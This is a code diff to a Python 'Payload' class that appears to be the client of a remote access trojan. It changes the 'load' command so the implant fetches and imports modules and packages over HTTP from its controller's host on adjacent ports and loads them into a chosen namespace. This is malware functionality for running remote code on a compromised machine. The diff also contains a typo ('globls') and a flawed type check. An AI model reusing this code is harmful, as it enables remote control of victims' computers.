@@ -406,16 +406,28 @@ class Payload():
         return self.mode.usage
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='load <module> [target]')
-    def load(self, module):
+    def load(self, args):
+        """ 
+        Remotely import a module or package
+
+        `Required`
+        :param str module:  name of module/package
+
+        `Optional`
+        :param str target:  name of the target destination (default: globals)
+
+        """
+        module, target = str(args).split()
+        target = globls()[target].__dict__ if bool(target in globals() and hasattr(target, '__dict__')) else globals()
         host, port = self.connection.getpeername()
         base_url_1 = 'http://{}:{}'.format(host, port + 1)
         base_url_2 = 'http://{}:{}'.format(host, port + 2)
         with globals()['remote_repo'](self.remote['modules'], base_url_1):
             with globals()['remote_repo'](self.remote['packages'], base_url_2):
                 try:
-                    exec("import {}".format(module), globals())
+                    globals()['imports'](module, target)
                 except Exception as e:
-                    return "{} error: {}".format(self.load.func_name, str(e))                    
+                    return "{} error: {}".format(self.load.func_name, str(e))
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
     def abort(self):
